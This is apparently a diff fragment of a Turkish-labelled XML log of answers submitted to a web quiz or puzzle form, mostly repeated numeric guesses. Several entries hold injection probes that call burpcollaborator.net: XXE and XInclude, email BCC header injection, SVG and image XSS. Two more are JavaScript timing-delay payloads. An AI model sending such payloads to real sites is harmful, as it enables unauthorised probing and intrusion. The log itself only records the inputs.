+    <Metin><oat xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://r80syalu4yn4fg45t5cl8g11xs3lreh2hq9dz1o.burpcollaborator.net/oat.xsd">oat</oat></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin><zkd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://pwpqm89sswb23es3h30jwepzlqrjfc506oybozd.burpcollaborator.net/foo"/></zkd></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763]]>><</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>(function(){if(typeof cdqug==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);cdqug=1;}}())</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763'+(function(){if(typeof lpy5z==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);lpy5z=1;}}())+'</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763
+BCC:x20ysgf0y4ha9mybnb6r2mv7ryxrlkb831rtej28@burpcollaborator.net
+cmj: g</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763>
+BCC:vmlwcezyi218tki979qpmkf5bwhp5iv6n0bsyim7@burpcollaborator.net
+msp: z</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 10.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>993763</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>99gazsmc5gomgy5nund39y2jya43swikacy4lu9j</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 12.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>668191</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.08</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>340037</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.08</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>340037</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.08</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>340037</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>'"><svg/onload=fetch`//pjcq98wsfwy2qef343njjecz8qej2cs0kq8iv8jx\.burpcollaborator.net`></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/hteij06kpo8u06pvevxbt6mriiobc42sujib51tqX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=></Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 13.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>140027</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.09.2021 Saat: 3.25</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraÅŸÃ¼t</Metin>
+  </CEVAP>
